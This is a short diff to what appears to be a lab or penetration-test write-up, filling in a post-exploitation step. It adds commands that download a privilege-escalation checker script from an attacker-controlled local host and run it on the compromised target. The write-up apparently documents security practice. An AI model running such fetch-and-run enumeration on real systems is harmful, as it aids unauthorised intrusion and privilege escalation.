@@ -89,9 +89,9 @@ ssh <username>@<target_ip>
 Post-exploitation enumeration was performed:
 
 ```bash
-wget <LinuxPrivChecker_script>
-chmod +x script.sh
-./script.sh
+wget http://192.168.10.7:9000/linuxprivchecker.py
+chmod +x linuxprivchecker.py
+./linuxprivchecker.py
 ```
 
 ### 🔎 Findings:
